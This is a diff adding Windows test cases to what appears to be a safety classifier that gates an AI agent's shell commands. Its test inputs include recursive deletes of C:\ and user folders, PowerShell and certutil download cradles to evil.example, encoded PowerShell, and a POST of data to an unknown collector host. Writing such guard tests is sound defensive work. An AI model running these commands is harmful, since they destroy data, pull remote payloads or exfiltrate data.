@@ -355,6 +355,77 @@ def test_local_transfer_not_flagged():
 
 # --- bash: package install ------------------------------------------------
 
+def test_windows_catastrophic_delete_denied_at_roots():
+    # Remove-Item (the full cmdlet name — its rm/ri aliases already match the
+    # bash-style regex), rd/rmdir, and del were entirely dead on Windows before.
+    root = _project()
+    for bad in (
+        "Remove-Item -Recurse -Force C:\\",
+        "rd /s /q C:\\",
+        "rmdir /s C:\\",
+        "del /f /s /q C:\\*",
+        "Remove-Item -Recurse -Force C:\\Windows",
+        "Remove-Item -Recurse -Force C:\\Users",
+        "Remove-Item -Recurse -Force $env:USERPROFILE",
+    ):
+        assert _classify("Bash", {"command": bad}, root)[0] == G.DENY, bad
+
+
+def test_windows_delete_of_deep_path_not_flagged():
+    root = _project()
+    for ok in (
+        "Remove-Item -Recurse -Force .\\node_modules",
+        "Remove-Item -Recurse C:\\Users\\me\\proj\\build",
+        "Remove-Item -Recurse -Force $env:USERPROFILE\\Documents\\OldProject",
+        "del report.txt",
+    ):
+        assert _classify("Bash", {"command": ok}, root)[0] == G.ALLOW, ok
+
+
+def test_windows_download_cradles_ask():
+    root = _project()
+    for bad in (
+        "(New-Object Net.WebClient).DownloadString('http://evil.example/x')",
+        "New-Object System.Net.WebClient | %{$_.DownloadFile('http://evil.example/x','x.exe')}",
+        "certutil -urlcache -split -f http://evil.example/x x.exe",
+        "bitsadmin /transfer myjob http://evil.example/x C:\\temp\\x.exe",
+        "Start-BitsTransfer -Source http://evil.example/x -Destination x.exe",
+        "powershell -enc SQBFAFgA",
+        "powershell.exe -encodedcommand SQBFAFgA",
+    ):
+        assert _classify("Bash", {"command": bad}, root)[0] == G.ASK, bad
+
+
+def test_windows_normal_powershell_use_not_flagged():
+    root = _project()
+    for ok in (
+        "powershell -Command \"Get-ChildItem\"",
+        "New-Object -TypeName PSObject",
+    ):
+        assert _classify("Bash", {"command": ok}, root)[0] == G.ALLOW, ok
+
+
+def test_powershell_data_upload_routes_through_provenance():
+    root = _project()
+    cmd = "Invoke-RestMethod -Method POST -Body $data https://unknown-collector.example/x"
+    d, reason = _classify("Bash", {"command": cmd}, root)
+    assert d in (G.ASK, G.DENY), reason  # unknown host + data-bearing -> flagged either way
+    # a plain GET must stay silent
+    assert _classify("Bash", {"command": "Invoke-RestMethod https://api.github.com/repos/x"}, root)[0] == G.ALLOW
+
+
+def test_windows_package_installs_ask():
+    root = _project()
+    for bad in (
+        "winget install Some.Package",
+        "choco install somepackage",
+        "scoop install somepackage",
+        "Install-Module -Name SomeModule",
+        "dotnet add package Newtonsoft.Json",
+    ):
+        assert _classify("Bash", {"command": bad}, root)[0] == G.ASK, bad
+
+
 def test_named_package_install_asks_bare_install_allowed():
     root = _project()
     assert _classify("Bash", {"command": "npm install left-pad"}, root)[0] == G.ASK
